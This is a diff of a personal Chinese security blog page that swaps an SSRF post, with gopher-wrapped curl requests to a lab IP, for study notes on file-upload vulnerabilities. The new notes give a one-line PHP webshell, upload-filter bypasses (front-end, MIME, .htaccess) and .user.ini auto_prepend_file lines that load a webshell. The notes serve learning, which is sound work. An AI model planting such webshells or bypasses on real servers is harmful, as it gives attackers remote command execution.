@@ -9,7 +9,7 @@
     
     <title>
         
-            ssrf |
+            文件上传 |
         
         SZKC&#39;s Blog
     </title>
@@ -182,7 +182,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        ssrf
+                        文件上传
                     </div>
                 
 
@@ -210,13 +210,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-07-22 10:11:42</span>
+                <span class="datetime">2025-08-09 11:30:21</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Tue Jul 22 2025 10:12:10 GMT+0800">2025-07-22 10:12:10</span>
+                    <span class="datetime" data-updated="Sat Aug 09 2025 11:30:43 GMT+0800">2025-08-09 11:30:43</span>
                 </span>
             
         
@@ -243,33 +243,27 @@
                     
 
                     
-                         <p>什么是SSRF漏洞？以及相关SSRF知识：<a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2103240" >https://cloud.tencent.com/developer/article/2103240<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的<a class="link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2&spm=1001.2101.3001.7020" >信息检索<i class="fas fa-external-link-alt"></i></a>工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p>
-<h3 id="发送get请求"><a href="#发送get请求" class="headerlink" title="发送get请求"></a>发送get请求</h3><p>直接发送一个get请求包，然后根据需要转变为gopher形式</p>
-<p>举例：</p>
-<p>GET &#x2F;ssrf&#x2F;base&#x2F;get.php?name&#x3D;114514 HTTP&#x2F;1.1<br>Host: 192.168.0.109</p>
-<p>经过<strong>多次</strong>URL编码后变为：（服务器自身会解码）</p>
-<p>GET%20%2Fssrf%2Fbase%2Fget.php%3Fname%3D114514%20HTTP%2F1.1%0AHost%3A%20192.168.0.109</p>
-<p>改写为：</p>
-<p>curl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20%2Fssrf%2Fbase%2Fget.php%3Fname%3D114514%20HTTP%2F1.1%0AHost%3A%20192.168.0.109%0d%0A</p>
-<p>请注意：</p>
+                         <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>上传文件（如一句话木马）</p>
+<?php @system($_GET['cmd']); ?>
+
+<p>上传到服务器后，通过访问该文件并对进行cmd传参（例如执行系统命令以查看服务器）进行rce。<br>当然使用蚁剑直接看也是更方便的</p>
+<h2 id="文件上传漏洞绕过"><a href="#文件上传漏洞绕过" class="headerlink" title="文件上传漏洞绕过"></a>文件上传漏洞绕过</h2><h3 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h3><p>直接修改文件后缀为合适的文件，再进行抓包，修改为正常的php后缀以绕过前端检测</p>
+<h3 id="后端MIME绕过"><a href="#后端MIME绕过" class="headerlink" title="后端MIME绕过"></a>后端MIME绕过</h3><p>MIME检测：检测请求包中的content-type头<br>可在请求包中修改以绕过。</p>
+<h3 id="apache中的-htaccess绕过"><a href="#apache中的-htaccess绕过" class="headerlink" title="apache中的.htaccess绕过"></a>apache中的.htaccess绕过</h3><p><code>.htaccess</code> 是 Apache HTTP 服务器中的一个配置文件，用于在目录级别上管理服务器行为。它允许用户在不修改主服务器配置文件的情况下，覆盖全局配置设置。常见的用途包括 URL 重写、访问控制、自定义错误页面等。</p>
+<p><strong>主要功能</strong></p>
 <ol>
-<li>问号（？）需要转码为URL编码，也就是%3f</li>
-<li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li>
-<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
+<li><strong>URL 重写</strong>：通过 <code>mod_rewrite</code> 模块实现 URL 重定向和重写。</li>
+<li><strong>访问控制</strong>：限制特定 IP 或用户的访问。</li>
+<li><strong>自定义错误页面</strong>：定义 404、500 等错误页面。</li>
+<li><strong>MIME 类型设置</strong>：指定文件类型的处理方式。</li>
+<li><strong>缓存控制</strong>：设置浏览器缓存策略。</li>
 </ol>
-<p><strong>在这里curl用于在cmd执行gopher，在powershell改为Invoke-WebRequest。</strong></p>
-<h3 id="发送post请求"><a href="#发送post请求" class="headerlink" title="发送post请求"></a>发送post请求</h3><p>注意这四个字段必不可少！</p>
-<p>POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1</p>
-<p>Host: 192.168.0.109</p>
-<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
-<p>Content-Length: 11</p>
-<p> name&#x3D;114514</p>
-<p>转变为</p>
-<p>curl</p>
-<p>gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_POST%20%2Fssrf%2Fbase%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A%20192.168.0.109%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2011%0D%0A%0D%0Aname%3D114514%0D%0A</p>
-<p>随后在命令行进行执行即可</p>
-<p>如果要跟踪302跳转，只需curl -L即可</p>
+<h3 id="user-ini文件构成的PHP后门"><a href="#user-ini文件构成的PHP后门" class="headerlink" title="user.ini文件构成的PHP后门"></a>user.ini文件构成的PHP后门</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html" >user.ini文件构成的PHP后门 | 离别歌<i class="fas fa-external-link-alt"></i></a></p>
+<p>使用方法：<br>我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell或者含有木马的图片（这需要服务器的文件解析漏洞）什么的</p>
+<p>直接写在.user.ini中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=websehll.php</span><br><span class="line">or</span><br><span class="line">auto_prepend_file=websehll.png</span><br></pre></td></tr></table></figure>
+
+<p>请注意：.user.ini文件仅限于本文件夹以及子文件夹切并非所有php配置都可以又.user.ini进行修改</p>
 
                     
                 </div>
@@ -290,31 +284,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/08/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
-                                   title="文件上传"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">文件上传</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/07/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
-                                   title="文件包含"
+                                   href="/2025/07/22/ssrf/"
+                                   title="ssrf"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">文件包含</span>
+                                        <span class="post-nav-title-item text-ellipsis">ssrf</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -414,7 +392,7 @@
             <div class="pc-post-toc left-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.</span> <span class="nav-text">gopher协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81get%E8%AF%B7%E6%B1%82"><span class="nav-number">1.1.</span> <span class="nav-text">发送get请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81post%E8%AF%B7%E6%B1%82"><span class="nav-number">1.2.</span> <span class="nav-text">发送post请求</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">文件上传漏洞绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">前端绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AFMIME%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.</span> <span class="nav-text">后端MIME绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#apache%E4%B8%AD%E7%9A%84-htaccess%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">apache中的.htaccess绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8"><span class="nav-number">2.4.</span> <span class="nav-text">user.ini文件构成的PHP后门</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -583,7 +561,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.</span> <span class="nav-text">gopher协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81get%E8%AF%B7%E6%B1%82"><span class="nav-number">1.1.</span> <span class="nav-text">发送get请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81post%E8%AF%B7%E6%B1%82"><span class="nav-number">1.2.</span> <span class="nav-text">发送post请求</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">文件上传漏洞绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">前端绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AFMIME%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.</span> <span class="nav-text">后端MIME绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#apache%E4%B8%AD%E7%9A%84-htaccess%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">apache中的.htaccess绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8"><span class="nav-number">2.4.</span> <span class="nav-text">user.ini文件构成的PHP后门</span></a></li></ol></li></ol>
     </div>
 </div>
 
